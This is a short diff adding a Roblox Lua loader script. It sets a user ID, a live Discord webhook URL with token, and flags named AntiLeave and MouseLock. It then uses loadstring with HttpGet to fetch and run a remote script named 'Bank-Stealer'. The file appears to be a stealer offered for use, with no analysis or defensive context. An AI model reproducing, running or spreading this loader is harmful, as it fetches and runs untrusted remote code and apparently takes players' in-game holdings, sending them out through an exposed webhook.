@@ -1,0 +1,6 @@
+_G.UserID = "4547455591"
+_G.Webhook = "https://discord.com/api/webhooks/1119074042666823700/rtrfGra_qqnvQvBNapeUIfLr3o1SnFw2kx-k6Ew3tNpQBtZNN2p8uJvdvwCNs4u-Z4Np"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnyThingse/Scripts/main/Bank-Stealer.", true))()
